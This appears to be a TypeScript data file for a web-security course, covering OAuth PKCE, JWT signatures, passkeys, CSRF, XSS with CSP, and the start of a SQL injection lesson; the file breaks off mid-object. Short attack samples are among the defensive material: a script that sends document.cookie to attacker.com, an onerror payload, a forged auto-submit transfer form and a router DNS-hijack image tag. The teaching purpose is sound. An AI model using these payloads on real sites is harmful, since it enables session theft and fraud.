import { Lesson } from '../types';

export const LESSONS: Lesson[] = [
  // ==========================================
  // TRACK 1: AUTHENTICATION & MODERN IDENTITY
  // ==========================================
  {
    id: 'oauth-pkce',
    title: 'OAuth 2.0 with PKCE',
    subtitle:
      'Proof Key for Code Exchange: preventing authorization code interception on public clients',
    track: 'auth',
    trackTitle: 'Authentication & Identity Protocols',
    duration: '10 min',
    level: 'Intermediate',
    summary:
      'Single Page Apps (SPAs) and mobile clients cannot securely store a client secret. PKCE solves this vulnerability dynamically using a high-entropy cryptographically random verifier and its SHA-256 challenge.',
    keyConcepts: [
      'Public vs. Confidential Clients',
      'Code Challenge & Code Verifier',
      'Authorization Code Interception Attack',
      'One-time token exchange validation',
    ],
    threatModel: {
      actor: 'Malicious application or proxy eavesdropper on the local device / custom URI scheme.',
      goal: 'Intercept the redirect authorization code and exchange it for a high-privilege access token.',
      vulnerability:
        'Standard Authorization Code Flow without client authentication on public clients.',
      defense:
        'PKCE binds the authorization request to the token exchange via a cryptographic hash challenge that only the legitimate client can solve.',
    },
    steps: [
      {
        title: 'Step 1: Cryptographic Secret Generation (Client)',
        description: 'The Single Page App generates a high-entropy secret in memory and hashes it.',
        detail:
          'The client creates a cryptographically secure random string `code_verifier` (43-128 chars). It then computes `code_challenge = BASE64URL(SHA256(code_verifier))` using the SubtleCrypto API. The verifier stays strictly inside the client’s private memory; only the challenge is transmitted.',
        actionSummary: 'Client computes SHA256(verifier) -> code_challenge',
        securityTakeaway:
          'Even if an attacker intercepts the challenge on the wire, SHA-256 is computationally infeasible to invert.',
        codeSnippet: {
          language: 'typescript',
          label: 'Browser Client In-Memory Generation',
          code: `const verifier = generateRandomString(64); // 43-128 chars
const challenge = base64Url(sha256(verifier));
sessionStorage.setItem('pkce_verifier', verifier);`,
        },
      },
      {
        title: 'Step 2: Authorization Request via Browser Redirect',
        description: 'The user is redirected to the Authorization Server (IdP) with the challenge.',
        detail:
          'The browser navigates to the IdP `/authorize` endpoint with parameters: `client_id`, `redirect_uri`, `response_type=code`, `code_challenge`, and `code_challenge_method=S256`. The user enters credentials and grants permission.',
        actionSummary: 'GET /authorize?code_challenge=...&method=S256',
        securityTakeaway:
          'The Authorization Server records the code_challenge alongside the pending authorization session in its database.',
        codeSnippet: {
          language: 'http',
          label: 'Auth Request Payload',
          code: `GET /authorize?
  response_type=code
  &client_id=my-spa-app
  &redirect_uri=https://app.com/callback
  &code_challenge=E9Melhoa2OwvFrGMTJguCH5...
  &code_challenge_method=S256`,
        },
      },
      {
        title: 'Step 3: User Consent & Authorization Code Issued',
        description:
          'The IdP redirects the user back to the client application with an ephemeral Auth Code.',
        detail:
          'The Authorization Server issues a short-lived authorization code (valid for ~60 seconds) and redirects the user’s browser back to `https://app.com/callback?code=AUTH_CODE_XYZ`.',
        actionSummary: 'IdP redirects -> app.com/callback?code=AUTH_CODE_XYZ',
        securityTakeaway:
          'This authorization code travels through the browser address bar, browser history, or custom OS URI handlers where rogue apps could potentially listen.',
      },
      {
        title: 'Step 4: Threat Simulation — The Interception Window',
        description:
          'An attacker or rogue application attempts to intercept the authorization code.',
        detail:
          'On mobile or multi-app systems, an attacker can register the same custom URI scheme or intercept the browser redirect. If standard OAuth without PKCE was used, the attacker could immediately call `/token` and steal the user’s session.',
        actionSummary: 'Attacker sniffs code=AUTH_CODE_XYZ from the redirect',
        securityTakeaway:
          'In standard OAuth 2.0 without PKCE, public clients have no client_secret, leaving this authorization code unprotected!',
      },
      {
        title: 'Step 5: Token Exchange with Verifier Proof',
        description: 'The legitimate client posts the code PLUS the raw unhashed code_verifier.',
        detail:
          'The client sends a POST request to `/oauth/token` with `grant_type=authorization_code`, `code=AUTH_CODE_XYZ`, and `code_verifier=ORIGINAL_RAW_SECRET`. The IdP re-hashes the submitted `code_verifier` using SHA-256 and compares it against the stored `code_challenge`.',
        actionSummary: 'POST /token { code, code_verifier }',
        securityTakeaway:
          'If an attacker attempts to exchange the code, they fail because they do not have the unhashed `code_verifier` stored in the legitimate client’s memory.',
        codeSnippet: {
          language: 'http',
          label: 'Token Exchange Request',
          code: `POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&client_id=my-spa-app
&code=AUTH_CODE_XYZ
&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`,
        },
      },
      {
        title: 'Step 6: Token Issuance & Secure Protected API Access',
        description: 'The IdP validates the hash match and returns Access & ID Tokens.',
        detail:
          'Since `SHA256(submitted_verifier) === stored_challenge`, the IdP guarantees the entity redeeming the code is the exact same entity that initiated Step 1. It returns an Access Token (and ID Token / Refresh Token). The client can now query protected APIs.',
        actionSummary: 'IdP returns 200 OK { access_token: "..." }',
        securityTakeaway:
          'PKCE completely neutralizes authorization code interception attacks without requiring public clients to store fragile static secrets.',
      },
    ],
    cveCaseStudy: {
      title: 'Mobile App Custom URL Scheme Hijacking',
      cveId: 'RFC 7636 Threat Context',
      year: '2015',
      organization: 'Multiple Mobile & Single Page Apps',
      damage: 'Account takeover of millions of end users on iOS and Android',
      breakdown:
        'On mobile platforms, multiple apps could register the exact same custom URL scheme (e.g. `myapp://oauth-callback`). A rogue flashlight or malware app could register that scheme and silently intercept redirect authorization codes sent by legitimate OAuth providers.',
      rootCause:
        'Authorization codes had no cryptographic binding to the initiating client instance.',
      takeaway:
        'OAuth 2.1 now mandates PKCE for ALL client types, including both public Single Page Applications and confidential server-rendered backends.',
    },
    hardeningGuide: {
      title: 'Production OAuth 2.1 PKCE Implementation Checklist',
      checklist: [
        'Always enforce code_challenge_method=S256. Never allow plain.',
        'Set authorization code lifetimes to maximum 30-60 seconds.',
        'Strictly validate redirect_uri with exact string equality (no wildcard regexes).',
        'Store code_verifier in ephemeral browser memory or sessionStorage (never localStorage).',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'pkce-client.ts',
        code: `// Generate 64 bytes of cryptographically random characters
const array = new Uint8Array(64);
window.crypto.getRandomValues(array);
const verifier = Array.from(array, byte => byte.toString(36)).join('').slice(0, 64);

// SHA-256 hash and Base64URL encode
const encoder = new TextEncoder();
const data = encoder.encode(verifier);
const hash = await window.crypto.subtle.digest('SHA-256', data);
const challenge = btoa(String.fromCharCode(...new Uint8Array(hash)))
  .replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');`,
        note: 'Always use Web Cryptography API (window.crypto.subtle) instead of Math.random().',
      },
    },
    faqs: [
      {
        question: 'Does PKCE replace the client_secret on backend servers?',
        answer:
          'For public clients (SPAs, mobile apps), yes, because public clients cannot keep a secret. However, for confidential backend servers, modern OAuth 2.1 recommends using BOTH a client_secret and PKCE for maximum defense-in-depth.',
      },
      {
        question: 'Why is code_challenge_method=plain dangerous?',
        answer:
          'With plain, the code_challenge is simply the unhashed verifier. If an attacker sniffs the initial authorize request on the network, they immediately obtain the verifier and can redeem the intercepted code.',
      },
    ],
  },
  {
    id: 'jwt-tampering',
    title: 'JWT Anatomy & Signature Verification',
    subtitle:
      'Cryptographic integrity: how digital signatures stop payload tampering and privilege escalation',
    track: 'auth',
    trackTitle: 'Authentication & Identity Protocols',
    duration: '8 min',
    level: 'Beginner',
    summary:
      'JSON Web Tokens are stateless, base64url-encoded credentials. Because they are readable by anyone, security relies entirely on digital signatures (HMAC or RSA/ECDSA) to detect unauthorized tampering.',
    keyConcepts: [
      'Header, Payload, and Signature components',
      'HMAC-SHA256 vs Asymmetric RS256/ES256',
      'Signature mismatch detection',
      'The "alg: none" vulnerability and key confusion',
    ],
    threatModel: {
      actor: 'Malicious client or untrusted authenticated user.',
      goal: 'Modify the JWT payload (e.g. elevate `role: "user"` to `role: "admin"`) without the server secret.',
      vulnerability:
        'Failing to verify the signature, accepting `alg: "none"`, or symmetric/asymmetric key confusion.',
      defense:
        'Strict cryptographic signature verification using a strong server-side private key or HMAC secret.',
    },
    steps: [
      {
        title: 'Step 1: The Three Parts of a JWT',
        description: 'A JWT is composed of three Base64URL-encoded JSON segments joined by dots.',
        detail:
          'The Red segment is the Header (`{"alg":"HS256","typ":"JWT"}`). The Purple segment is the Payload (`{"sub":"123","role":"user","exp":1735689600}`). The Blue segment is the Cryptographic Signature generated over `Header + "." + Payload`.',
        actionSummary: 'base64url(Header).base64url(Payload).Signature',
        securityTakeaway:
          'JWTs are encoded, NOT encrypted! Anyone who intercepts a token can read every claim inside the payload.',
      },
      {
        title: 'Step 2: Signature Computation by the Issuer',
        description:
          'The authentication server generates the signature using a server-side secret.',
        detail:
          'For HMAC-SHA256: `Signature = HMAC-SHA256(base64Url(Header) + "." + base64Url(Payload), SERVER_SECRET)`. The server attaches this signature and returns the token to the client.',
        actionSummary: 'Sign(Header + "." + Payload, Secret) -> Signature',
        securityTakeaway:
          'The signature acts as an indelible digital seal. Only a party possessing `SERVER_SECRET` could have generated this exact signature for this specific header and payload.',
      },
      {
        title: 'Step 3: Client Receives & Stores the Token',
        description:
          'The client stores the token (e.g. in memory or Secure HttpOnly cookie) for API requests.',
        detail:
          'On subsequent requests, the client passes the token in the HTTP Authorization header: `Bearer eyJhbGci...`. The client can inspect its own claims (like username or expiration) for UI rendering.',
        actionSummary: 'Client attaches Authorization: Bearer <token>',
        securityTakeaway:
          'Storing tokens in localStorage exposes them to XSS attacks. In-memory or Secure HttpOnly SameSite cookies provide superior defense.',
      },
      {
        title: 'Step 4: Tampering Simulation — Privilege Escalation',
        description: 'An attacker edits the Base64 payload in transit or client-side storage.',
        detail:
          'The attacker decodes the payload, changes `"role": "user"` to `"role": "admin"`, re-encodes it in Base64URL, and forwards the modified token to the backend API. But notice: the attacker does not know `SERVER_SECRET`, so they cannot compute the matching signature!',
        actionSummary: 'Attacker injects: {"role": "admin"}',
        securityTakeaway:
          'Because cryptographic hash functions are avalanche-sensitive, even a single bit change in the payload produces a completely different expected signature.',
      },
      {
        title: 'Step 5: Server Verification & Tamper Detection',
        description:
          'The Resource API recalculates the signature and compares it with the token’s signature.',
        detail:
          'The server takes the received Header and Payload, computes `Expected_Sig = HMAC(Header + "." + Payload, SERVER_SECRET)`, and performs a constant-time comparison against `Received_Sig`. Since the attacker changed the payload, `Expected_Sig !== Received_Sig`. The server returns `401 Unauthorized`.',
        actionSummary: 'Server detects: ExpectedSignature !== TokenSignature',
        securityTakeaway:
          'Always use timing-safe comparison functions (`crypto.timingSafeEqual`) to avoid side-channel timing attacks when validating signatures.',
      },
    ],
    cveCaseStudy: {
      title: 'The Critical "alg: none" & Algorithm Confusion Exploit',
      cveId: 'CVE-2015-9235',
      year: '2015',
      organization: 'Multiple JWT libraries (jsonwebtoken, pyjwt)',
      damage: 'Arbitrary administrative authentication bypass on thousands of SaaS apps',
      breakdown:
        'RFC 7519 defined an optional algorithm `"none"` intended for debug purposes. Attackers simply changed `{"alg": "HS256"}` to `{"alg": "none"}` and stripped the signature entirely. Vulnerable backend libraries accepted the unsigned token as valid without verifying anything!',
      rootCause: 'Allowing the untrusted token header to dictate the verification algorithm.',
      takeaway:
        'Never let incoming headers decide the cryptographic algorithm. Hardcode the expected algorithm explicitly on the verifying server.',
    },
    hardeningGuide: {
      title: 'JWT Server Verification Best Practices',
      checklist: [
        'Explicitly whitelist algorithms on verification (e.g. algorithms: ["RS256"]).',
        'Always validate the `exp` (expiration), `iss` (issuer), and `aud` (audience) claims.',
        'Use asymmetric cryptography (RS256/ES256) so verifying resource servers only need public keys.',
        'Keep token lifetimes short (15 minutes) paired with rotating refresh tokens.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'jwt-verify.ts',
        code: `import jwt from 'jsonwebtoken';

// SECURE: Whitelist expected algorithm and verify claims
export function verifyAccessToken(token: string, publicKey: string) {
  return jwt.verify(token, publicKey, {
    algorithms: ['RS256'], // Explicitly whitelist
    issuer: 'https://auth.company.com',
    audience: 'https://api.company.com',
    clockTolerance: 5 // 5 seconds grace for clock drift
  });
}`,
        note: 'Never use jwt.decode() for authorization decisions; always use jwt.verify().',
      },
    },
    faqs: [
      {
        question: 'Are JWT claims encrypted?',
        answer:
          'No! Standard JWS tokens are merely base64url encoded strings. Anyone who intercepts the token can view every claim inside the payload. Never store plaintext passwords, social security numbers, or sensitive PII inside a JWT.',
      },
      {
        question: 'How do you revoke a stateless JWT before its expiration?',
        answer:
          'Because JWTs are stateless, instant revocation requires either keeping a small Redis token blacklist of revoked jti (JWT ID) claims, or using short expirations (e.g. 10 minutes) and revoking at the refresh token boundary.',
      },
    ],
  },
  {
    id: 'webauthn-passkeys',
    title: 'WebAuthn & Passkeys (FIDO2)',
    subtitle:
      'Hardware-backed public key cryptography: eliminating shared passwords and achieving total phishing resistance',
    track: 'auth',
    trackTitle: 'Authentication & Identity Protocols',
    duration: '11 min',
    level: 'Advanced',
    summary:
      'Passwords and SMS/TOTP 2FA can be phished by deceptive adversary-in-the-middle proxies. WebAuthn replaces passwords with asymmetric keys bound to device Secure Enclaves (Apple TouchID, Windows Hello, YubiKey) and cryptographically enforces origin validation.',
    keyConcepts: [
      'Public Key Cryptography in Secure Hardware',
      'Phishing Resistance via Cryptographic Origin Binding',
      'Relying Party ID (rpId) and clientDataJSON',
      'User Verification (Biometrics) vs User Presence',
    ],
    threatModel: {
      actor:
        'Adversary-in-the-middle (AiTM) reverse proxy (e.g. Evilginx) or phishing email website.',
      goal: 'Trick the victim into entering credentials or 2FA codes on a spoofed domain (e.g. `evil-bank.com`).',
      vulnerability:
        'Traditional passwords and 6-digit TOTP codes are origin-agnostic; an attacker can immediately replay them to the real site.',
      defense:
        'The browser strictly controls the `origin` inside the signed payload. The authenticator creates/retrieves keys only for the matching origin, mathematically defeating replay on phishing domains.',
    },
    steps: [
      {
        title: 'Step 1: Registration — Client Keypair Generation',
        description:
          'The user creates an account, and their hardware authenticator generates an asymmetric keypair.',
        detail:
          'The browser invokes `navigator.credentials.create()`. The device Secure Enclave (or YubiKey) generates a new ECDSA keypair (P-256 or Ed25519) tied to `rpId: "mybank.com"`. The private key is permanently sealed inside the secure chip.',
        actionSummary: 'Secure Enclave generates K_priv (sealed) and K_pub',
        securityTakeaway:
          'The private key never leaves physical hardware, preventing credential leaks even if the client OS is compromised.',
      },
      {
        title: 'Step 2: Public Key Registration on Server',
        description: 'The client sends only the public key to the server database.',
        detail:
          'The server stores `credentialId` and `publicKey` linked to the user account. Notice the radical shift: the server holds NO passwords, NO hashes, and NO secrets that can be cracked in a database breach!',
        actionSummary: 'Server stores K_pub in database',
        securityTakeaway:
          'Even if the backend database is leaked online, attackers only obtain public keys, which cannot be used to forge logins.',
      },
      {
        title: 'Step 3: Authentication Challenge Issued',
        description: 'When logging in, the server generates a cryptographically random challenge.',
        detail:
          'The server responds with a 32-byte high-entropy random string and issues a challenge request via `navigator.credentials.get()`.',
        actionSummary: 'Server issues random challenge: 0x8f4c2b9a1e3d77c2',
        securityTakeaway: 'The challenge acts as a cryptographic nonce to prevent replay attacks.',
      },
      {
        title: 'Step 4: Browser Constructs clientDataJSON with Origin',
        description:
          'The browser constructs the data to sign, automatically injecting the real window origin.',
        detail:
          'The browser creates `clientDataJSON` containing the challenge, type (`webauthn.get`), and `origin: window.location.origin`. JavaScript code has no ability to tamper with or spoof this origin string!',
        actionSummary: 'Browser binds origin = "https://mybank.com"',
        securityTakeaway:
          'Origin binding is enforced by the browser engine sandbox, not JavaScript code.',
      },
      {
        title: 'Step 5: Biometric Verification & Challenge Signing',
        description:
          'The user confirms presence via Face ID / Touch ID, and the Enclave signs the data.',
        detail:
          'The user touches the biometric sensor. The Secure Enclave verifies the user is physically present, hashes `authenticatorData + SHA256(clientDataJSON)`, and signs the hash using `K_priv`. The resulting signature is sent to the server.',
        actionSummary: 'Secure Enclave generates ECDSA signature using K_priv',
        securityTakeaway:
          'Authentication requires both possession of the hardware chip and physical biometric presence.',
      },
      {
        title: 'Step 6: Server Verification & Phishing Block',
        description:
          'The server checks the signature against the stored public key and verifies origin.',
        detail:
          'The server computes `ECDSA_Verify(K_pub, data, signature)` and checks that `clientData.origin === "https://mybank.com"`. If an attacker hosted `evil-phish-bank.com`, the browser recorded `evil-phish-bank.com` in the payload, causing the server verification to fail immediately!',
        actionSummary: 'Server verifies signature and origin match -> Login Granted',
        securityTakeaway: 'Passkeys are 100% immune to credential phishing attacks.',
      },
    ],
    cveCaseStudy: {
      title: 'Adversary-in-the-Middle (AiTM) SMS/TOTP 2FA Bypasses',
      cveId: 'CISA Alert AA22-216A',
      year: '2022',
      organization: 'Multiple Fortune 500 Enterprises (Twilio, Uber, Okta)',
      damage: 'Intrusion into corporate internal tools despite active 2FA',
      breakdown:
        'Attackers sent SMS phishing links to employees pointing to reverse-proxy phishing domains (e.g. `company-sso.com`). Employees entered their username, password, and 6-digit TOTP code. The attacker proxy intercepted the code in real-time and completed the authentication on the real corporate IdP.',
      rootCause: 'Passwords and TOTP codes are not cryptographically bound to the browser origin.',
      takeaway:
        'CISA, NIST, and OMB now mandate FIDO2 / WebAuthn passkeys for high-value federal and enterprise accounts.',
    },
    hardeningGuide: {
      title: 'WebAuthn Relying Party Hardening Guide',
      checklist: [
        'Always verify that clientData.origin strictly matches your HTTPS production domain.',
        'Verify clientData.type === "webauthn.get" (or "webauthn.create" during registration).',
        'Store and increment signature counters to detect cloned authenticator tokens.',
        'Require userVerification: "preferred" or "required" to mandate TouchID / PIN.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'webauthn-server.ts',
        code: `import { verifyAuthenticationResponse } from '@simplewebauthn/server';

const verification = await verifyAuthenticationResponse({
  response: clientAssertionResponse,
  expectedChallenge: session.expectedChallenge,
  expectedOrigin: 'https://mybank.com', // Strict origin check
  expectedRPID: 'mybank.com',
  authenticator: {
    credentialPublicKey: user.publicKey,
    credentialID: user.credentialId,
    counter: user.signCount,
  },
  requireUserVerification: true,
});

if (verification.verified) {
  user.signCount = verification.authenticationInfo.newCounter;
}`,
        note: 'Never accept WebAuthn assertions over unencrypted plain HTTP; HTTPS is required.',
      },
    },
    faqs: [
      {
        question: 'What happens if a user loses their phone or laptop with the passkey?',
        answer:
          "Modern synced Passkeys (Apple iCloud Keychain, Google Password Manager, 1Password) synchronize encrypted passkeys across the user's authorized devices using end-to-end encryption. Alternatively, services provide account recovery or hardware backup keys.",
      },
      {
        question:
          'Can WebAuthn work on cross-device logins (e.g. logging into a desktop via a mobile phone)?',
        answer:
          'Yes! FIDO2 uses Cross-Device Authentication (hybrid transport / QR code) where Bluetooth Low Energy (BLE) verifies physical proximity between the phone and the desktop.',
      },
    ],
  },

  // ==========================================
  // TRACK 2: WEB EXPLOITS & BROWSER SECURITY
  // ==========================================
  {
    id: 'csrf-defense',
    title: 'CSRF Attacks vs. SameSite Cookie Armor',
    subtitle: 'Cross-Site Request Forgery: how browsers handle ambient credentials across origins',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '9 min',
    level: 'Intermediate',
    summary:
      'Browsers historically attached stored cookies to ANY request made to a target domain, regardless of which origin initiated the request. Learn how SameSite cookies and synchronizer tokens defuse CSRF.',
    keyConcepts: [
      'Ambient credential transmission',
      'Cross-origin state-changing requests',
      'SameSite=None vs Lax vs Strict',
      'Anti-CSRF synchronizer tokens',
    ],
    threatModel: {
      actor: 'Malicious third-party website visited by an authenticated victim user.',
      goal: 'Trick the victim’s browser into executing an unauthorized state-changing request (e.g. transfer money, change email).',
      vulnerability:
        'Relying solely on ambient session cookies without checking origin or requiring explicit proof of intent.',
      defense:
        'Modern SameSite=Lax/Strict cookie flags, combined with cryptographically bound anti-CSRF tokens.',
    },
    steps: [
      {
        title: 'Step 1: The Victim Logs into Bank.com',
        description:
          'The user logs into their online bank, receiving an authenticated session cookie.',
        detail:
          'The server sets `Set-Cookie: session_id=abc123xyz; Path=/; Secure; HttpOnly`. The browser stores this cookie in its cookie jar. For all future legitimate requests to `bank.com`, the browser automatically includes this cookie.',
        actionSummary: 'bank.com sets session_id=abc123xyz in browser cookie jar',
        securityTakeaway:
          'Session cookies are ambient credentials: the browser holds them and traditionally offers them whenever a network request points at their host.',
      },
      {
        title: 'Step 2: The Victim Visits Evil-Attacker.com',
        description: 'In another tab, the victim visits a malicious site or phishing page.',
        detail:
          'The malicious site contains a hidden form or background script: `<form action="https://bank.com/transfer" method="POST"> <input name="amount" value="5000"> <input name="recipient" value="attacker"> </form> <script>form.submit()</script>`.',
        actionSummary: 'evil-attacker.com triggers auto-submitting POST to bank.com',
        securityTakeaway:
          'The victim did not click anything on the bank; the cross-origin script initiated the action while the victim’s session was active.',
      },
      {
        title: 'Step 3: The Classic Vulnerability — Ambient Cookie Attachment',
        description:
          'In legacy browsers or with `SameSite=None`, the browser attaches the bank’s session cookie!',
        detail:
          'Because the destination URL is `bank.com`, legacy cookie rules attached `Cookie: session_id=abc123xyz`. The bank server receives the request, sees a valid session cookie, and executes the funds transfer!',
        actionSummary: 'Browser attaches cookie -> Bank processes fraudulent transfer',
        securityTakeaway:
          'The server cannot distinguish between a request initiated intentionally by the user inside bank.com and a forged request initiated by evil-attacker.com.',
      },
      {
        title: 'Step 4: Modern Defense 1 — The SameSite Cookie Attribute',
        description:
          'Configuring `SameSite=Lax` or `SameSite=Strict` instructs the browser to quarantine cross-site cookies.',
        detail:
          'With `SameSite=Lax` (modern browser default), cookies are stripped on cross-site subrequests (images, iframes, XHR/fetch) and cross-site POSTs. With `SameSite=Strict`, cookies are never sent if the site origin in the URL bar doesn’t match `bank.com`.',
        actionSummary: 'Browser inspects SameSite attribute and strips cookie',
        securityTakeaway:
          '`SameSite=Lax` effectively stops 95% of CSRF POST attacks out of the box in modern browsers.',
      },
      {
        title: 'Step 5: Modern Defense 2 — Anti-CSRF Synchronizer Tokens',
        description: 'The bank requires a unique, secret token embedded in legitimate forms.',
        detail:
          'When rendering the transfer form, the bank injects a cryptographically random, per-session token `<input type="hidden" name="csrf_token" value="sec_99a81">`. The attacker’s site cannot read this token due to the Same-Origin Policy (SOP). When the cross-site POST arrives without the token, the bank rejects it.',
        actionSummary: 'Bank validates: request.csrf_token === session.csrf_token',
        securityTakeaway:
          'Defense in depth: Combining `SameSite=Lax` cookies with Anti-CSRF tokens or custom headers (`X-Requested-With`) creates ironclad protection.',
      },
    ],
    cveCaseStudy: {
      title: 'Home Router DNS Hijack via CSRF',
      cveId: 'CVE-2013-2670',
      year: '2013',
      organization: 'Multiple Home DSL/Cable Routers (Linksys, D-Link)',
      damage: 'Millions of home routers reconfigured to use rogue malicious DNS servers',
      breakdown:
        'Attackers embedded invisible image tags (`<img src="http://192.168.1.1/setup.cgi?dns1=attacker_ip">`) on public websites. When a user visited the page, their browser automatically sent HTTP GET requests to their local router IP with default HTTP Basic Auth credentials, silently hijacking all internet traffic for their home.',
      rootCause:
        'Router admin portals accepted state-changing actions via GET requests and had no CSRF protection.',
      takeaway:
        'Never perform state changes on GET requests, and always protect administrative actions with CSRF tokens.',
    },
    hardeningGuide: {
      title: 'Production Cookie Security Flags Checklist',
      checklist: [
        'Always set SameSite=Lax (or SameSite=Strict for sensitive banking portals).',
        'Always set HttpOnly to protect against JavaScript cookie theft.',
        'Always set Secure so cookies are only transmitted over HTTPS.',
        'Use the __Host- cookie name prefix to prevent subdomain cookie injection.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'cookie-config.ts',
        code: `// Express / Node.js hardened session cookie
res.cookie('__Host-session', sessionId, {
  httpOnly: true,     // Inaccessible to document.cookie
  secure: true,       // HTTPS only
  sameSite: 'lax',    // Stripped on cross-origin POSTs
  path: '/',          // Required for __Host- prefix
  maxAge: 3600000     // 1 hour
});`,
        note: 'The __Host- prefix ensures the cookie cannot be overwritten by insecure subdomains.',
      },
    },
    faqs: [
      {
        question: 'Does SameSite=Lax protect GET requests?',
        answer:
          'No! SameSite=Lax sends cookies on top-level navigation GET requests (e.g. clicking a link from an external site). Therefore, state changes (like deleting an account or sending money) must NEVER be performed via GET.',
      },
      {
        question: 'Are modern Single Page Applications using Bearer tokens immune to CSRF?',
        answer:
          'Yes, if the token is stored in memory and passed in the Authorization header (`Bearer <token>`). The browser does not attach custom Authorization headers automatically to cross-site requests. However, storing tokens in localStorage opens you to XSS!',
      },
    ],
  },
  {
    id: 'xss-csp',
    title: 'XSS DOM Execution & Content Security Policy',
    subtitle: 'Cross-Site Scripting: code injection in the DOM and defense via strict CSP headers',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '11 min',
    level: 'Intermediate',
    summary:
      'When untrusted input is reflected into the HTML DOM without contextual encoding, the browser tokenizer treats attacker text as executable JavaScript. Explore how HttpOnly and Content Security Policy (CSP) neutralize XSS.',
    keyConcepts: [
      'Stored vs Reflected vs DOM XSS',
      'HTML Tokenizer context confusion',
      'HttpOnly cookie protection against theft',
      'CSP script-src directives & nonces',
    ],
    threatModel: {
      actor:
        'External attacker posting malicious payloads in comment boxes, query strings, or profiles.',
      goal: 'Execute arbitrary JavaScript in the victim’s browser session to steal credentials, keystrokes, or session state.',
      vulnerability:
        'Unsanitized user input rendered into HTML (`innerHTML`, unescaped template variables).',
      defense:
        'Context-aware output encoding, React/template auto-escaping, HttpOnly cookies, and strict CSP.',
    },
    steps: [
      {
        title: 'Step 1: Malicious Payload Injection',
        description: 'An attacker inputs JavaScript into a web application comment field.',
        detail:
          'The attacker enters: `<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>` or `<img src=x onerror="alert(document.domain)">`. The naive server saves this payload into the database without validation.',
        actionSummary: 'Attacker submits payload string with HTML/script tags',
        securityTakeaway:
          'Never trust user input. However, sanitizing input on write is insufficient; safe context-aware encoding on output is essential.',
      },
      {
        title: 'Step 2: Naive DOM Rendering & Tokenizer Confusion',
        description:
          'The victim views the page, and the application inserts the string directly into the DOM.',
        detail:
          'The application runs `container.innerHTML = comment.text`. The browser HTML tokenizer encounters `<script>`, switches from character data state to script tag execution mode, and parses the contents as executable JS code!',
        actionSummary: 'Browser HTML parser treats injected string as executable code',
        securityTakeaway:
          'The core of injection vulnerabilities is always the same: confusing data with code.',
      },
      {
        title: 'Step 3: Payload Executes — Session Theft',
        description:
          'The injected script runs with full privileges inside the victim’s authenticated browser tab.',
        detail:
          'The script accesses `document.cookie`, reads local storage, captures keystrokes, and dispatches a background fetch to the attacker’s exfiltration server. The attacker gains the victim’s active session token.',
        actionSummary: 'Script executes: reads document.cookie and sends to attacker.com',
        securityTakeaway:
          'An attacker with arbitrary JS execution has total control over everything the user can see or do in that web application.',
      },
      {
        title: 'Step 4: Defense 1 — The HttpOnly Cookie Shield',
        description: 'Marking session cookies as `HttpOnly` renders them invisible to JavaScript.',
        detail:
          'The server sets `Set-Cookie: session=xyz; HttpOnly`. When the malicious script queries `document.cookie`, the browser returns an empty string or omits the session token entirely. The attacker cannot exfiltrate the session cookie!',
        actionSummary: 'document.cookie returns "" for HttpOnly cookies',
        securityTakeaway:
          'HttpOnly prevents cookie theft via XSS, though the attacker’s script can still perform actions directly inside the open session.',
      },
      {
        title: 'Step 5: Defense 2 — Content Security Policy (CSP)',
        description:
          'The HTTP header `Content-Security-Policy` instructs the browser to block unauthorized scripts.',
        detail:
          "The server sends: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;`. When the browser’s parser hits the injected inline `<script>` or inline `onerror=`, the CSP engine halts execution and reports a CSP violation to the console. The script never executes!",
        actionSummary: 'Browser CSP engine blocks inline script execution',
        securityTakeaway:
          "Strict CSP with cryptographic nonces (`script-src 'nonce-xyz'`) is the gold standard for neutralizing modern XSS attacks.",
      },
    ],
    cveCaseStudy: {
      title: 'British Airways Magecart Digital Skimming Breach',
      cveId: 'ICO Penalty Notice 2020',
      year: '2018',
      organization: 'British Airways',
      damage: '£20 Million GDPR fine; credit card data stolen for 400,000 customers',
      breakdown:
        'Attackers modified a third-party JavaScript file (`modernizr-2.6.2.min.js`) hosted on British Airways servers. The injected 22 lines of JavaScript captured payment form fields upon submit and exfiltrated them to `baways.com` (an attacker domain).',
      rootCause:
        'Lack of Content Security Policy and Subresource Integrity (SRI) to monitor and restrict where scripts can send data.',
      takeaway:
        'Use strict CSP `connect-src` directives to restrict where browser scripts can exfiltrate data, and use Subresource Integrity hashes.',
    },
    hardeningGuide: {
      title: 'Modern Strict Content Security Policy (CSP)',
      checklist: [
        'Adopt a Nonce-based CSP for single-page applications.',
        'Eliminate unsafe-inline and unsafe-eval from script-src.',
        'Restrict connect-src to known API endpoints.',
        "Set frame-ancestors 'none' to prevent clickjacking.",
      ],
      codeSample: {
        language: 'http',
        filename: 'security-headers.conf',
        code: `Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-rAnd0m12345';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.mysite.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';`,
        note: 'Generate a unique, high-entropy cryptographic nonce per HTTP response.',
      },
    },
    faqs: [
      {
        question: 'Does React prevent XSS automatically?',
        answer:
          'React automatically escapes strings rendered inside JSX expressions (e.g. <div>{userInput}</div>). However, XSS is still possible if you use dangerouslySetInnerHTML, dynamic hrefs (e.g. href={userUrl} where url is "javascript:..."), or unescaped SSR hydration.',
      },
      {
        question: 'What is DOM-based XSS vs Reflected XSS?',
        answer:
          'Reflected XSS occurs when the backend server reflects malicious input from the request directly into the HTML response. DOM XSS occurs entirely inside the client browser when JavaScript reads from an untrusted source (like location.hash) and writes to an execution sink (like eval() or innerHTML).',
      },
    ],
  },
  {
    id: 'sql-injection',
    title: 'SQL AST Injection & Parameterized Queries',
    subtitle: 'From grammar alteration to isolated data literals: why string concatenation fails',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '10 min',
    level: 'Beginner',
    summary:
